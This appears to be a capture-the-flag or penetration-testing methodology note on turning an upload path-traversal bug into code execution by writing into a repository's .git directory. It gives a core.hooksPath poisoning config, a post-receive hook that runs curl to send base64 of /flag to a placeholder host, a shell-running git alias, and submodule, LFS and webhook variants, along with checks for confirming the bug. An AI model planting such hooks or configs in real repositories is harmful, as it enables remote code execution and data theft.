# Git-Adjacent Upload — .git paths, hooks, and config

## The shape — a write that reaches `.git/`

An upload traversal/`path` field that lands files inside `.git/` — the
repository's own data becomes writable:

- `.git/config` — repo config — `core.hooksPath`/`core.editor`/`alias` —
  config-as-code
- `.git/hooks/*` — `post-receive`/`pre-commit`/`post-merge` exec on git ops
- `.git/refs/heads/...` — branch-tip writes
- `.git/objects/` — object blob writes

## `core.hooksPath` — the config-poison exec

```ini
[core]
  hooksPath = /tmp/evil-hooks
```

Now `git <any-op>` runs `/tmp/evil-hooks/post-*` — the config is the
exec vector, no hook-script writing needed beyond the config.

## `.git/hooks/` — the direct script write

```
.git/hooks/post-receive:
#!/bin/sh
curl https://YOU:8000/?d=$(cat /flag | base64)
```

Next `git push`/`merge`/`checkout` runs it — the trigger is any git
operation — a CI build, a deploy pull, a `git status` (some hooks).

## `.git/objects/` — object integrity problems

Git objects are zlib-compressed blobs — a malformed object can crash
git or inject a blob — niche, requires knowing the object-hash
structure.

## `.git/config` `alias.*` — alias-to-shell

```ini
[alias]
  st = "!sh -c 'id > /tmp/x'"
```

`git st` runs the shell — the alias is a stored command.

## The non-`.git` git-adjacent paths

- `Makefile`/`.gitmodules`/`gitmodules` in a parent dir — `git submodule`
  reads `.gitmodules` — `url`/`path` fields can point anywhere
- `.gitignore`/`gitignore_global` — ignore-list changes (hiding files)
- `git-lfs` config `lfs.url` — object fetch redirection

## The "git pull" webhook — the classic CI shape

A `webhook`/`deploy` endpoint that runs `git pull` on your push — the
`.git/config`/`hooks` write executes at pull time — the classic
"write to `.git/hooks/post-merge`" exec chain.

## Detection — does `.git/` exist and is it writable?

- `.git/` dir listing/serving — `web-info-disclosure`'s `.git` leak is
  the READ side; this file is the WRITE side
- `?path=../.git/config` upload — does it create/modify the file?
- `git rev-parse`/`git status` on the repo — does the write reflect?

## Falsifiers

- no `.git` reachable from the write path
- `.git` exists but `core.fileMode`/`hooksPath` ignored, hooks disabled

## Output to record

- the `.git` write-path reached + which config/hook field is the exec hook
